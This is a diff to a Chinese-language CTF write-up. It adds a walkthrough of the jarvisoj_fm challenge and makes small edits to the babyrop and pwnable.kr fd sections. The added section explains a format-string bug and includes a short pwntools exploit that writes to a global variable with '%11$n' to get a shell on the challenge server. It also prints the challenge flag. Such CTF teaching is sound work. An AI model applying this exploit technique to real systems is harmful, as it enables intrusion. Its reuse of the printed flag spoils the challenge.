@@ -506,7 +506,7 @@ io.interactive()
 
 ![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/1.png)
 
-用`IDA Pro 32bit`打开附件`babyrop`，按`F5`  反汇编源码并查看主函数，可以看到将一个随机数赋值给了`buf`变量。
+用`IDA Pro 32bit`打开附件`babyrop`，按`F5`反汇编源码并查看主函数，可以看到将一个随机数赋值给了`buf`变量。
 
 ![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/2.png)
 
@@ -559,6 +559,48 @@ io.interactive()
 ```
 
 ![](https://paper.tanyaodan.com/BUUCTF/ogeek2019_babyrop/6.png)
+
+------
+
+### [jarvisoj_fm](https://buuoj.cn/challenges#jarvisoj_fm)
+
+先`file ./jarvisoj_fm`查看文件类型再`checksec --file=./jarvisoj_fm`检查一下文件保护情况。
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/1.png)
+
+用`IDA Pro 32bit`打开附件`babyrop`，按`F5`反汇编源码并查看主函数，可以看到声明了一个可用栈大小为`0x5C`字节的`char`型变量`buf`，`read()`函数从`stdin`中读取了`0x50`字节数据到变量`buf`中。接着出现了一个明显的格式化字符串漏洞，
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/2.png)
+
+双击变量`x`查看其在内存中的地址信息为`0x804A02C`。
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/3.png)
+
+第10行的`printf()`其地址信息为`0x80485AD`，我们可以在这里设置一个断点。
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/4.png)
+
+`run`运行程序，输入多个`a`字符。
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/5.png)
+
+`x/16wx $esp`的意思是以`16`进制查看`$esp`寄存器的参数信息，`a`的`ACSII`码的`16`进制是`0x61`，我们可以看到赋值参数在第`11`位。接着我们利用`x`的地址配合上`%11$n`将`x`的值修改为`4`，即可让程序系统调用`/bin/sh`终端从而拿到`flag`。
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/6.png)
+
+编写`Python`代码即可得到`flag{0516c5fb-3bf9-4ea8-a3ae-db6489a1db76}`。
+
+```python
+from pwn import *
+
+io = remote('node4.buuoj.cn', 29158)
+x_addr = 0x804A02C
+payload = p32(x_addr) + b'%11$n'
+io.sendline(payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/BUUCTF/jarvisoj_fm/7.png)
 
 ------
 
@@ -1449,7 +1491,7 @@ ssh fd@pwnable.kr -p2222 (pw:guest)
 
 我们通过代码审计可以看到变量`buf`被分配了`32`个字节作为缓冲区，该程序首先检查用户是否输入了两个参数(包括文件名)，如果没有就会得到一条`printf`输出语句提示需要给该可执行文件传递一个参数。
 
-然后我们发现有个`int`型变量`fd`被赋值为`atoi(argv[1])-0x1234`，即用户输入的数字被`atoi()`函数转换成`int`型后与`0x1234`的差值。此外还有一个`int`型变量`len`的值是`read(fd, buf, 32)`的函数返回值，当`fd`的值为`0`的时候，程序将从`stdin`中读入`32`个字节数据到`buf`变量中，因此我们输入的参数应该是`0x1234`的十进制值`4660`。
+然后我们发现有个`int`型变量`fd`被赋值为`atoi(argv[1])-0x1234`，即用户输入的数字被`atoi()`函数转换成`int`型后与`0x1234`的差值。此外还有一个`int`型变量`len`的值是`read(fd, buf, 32)`的函数返回值。在`Linux`机器和`C`语言中，`Linux`文件描述符的值为`0`表示标准输入`stdin`，`1`表示标准输出`stdout`，`2`表示标准错误`stderr`。当`fd`的值为`0`的时候，程序将从`stdin`中读入`32`个字节数据到`buf`变量中，因此我们输入的参数应该是`0x1234`的十进制值`4660`。
 
 接着有一个字符串比较函数`strcmp()`，如果`buf`变量的值等于字符串`LETMEWIN`的话，`strcmp()`函数返回值就为0，此时`if`条件就为真，程序会系统调用输出`flag`：`mommy! I think I know what a file descriptor is!!`。
 
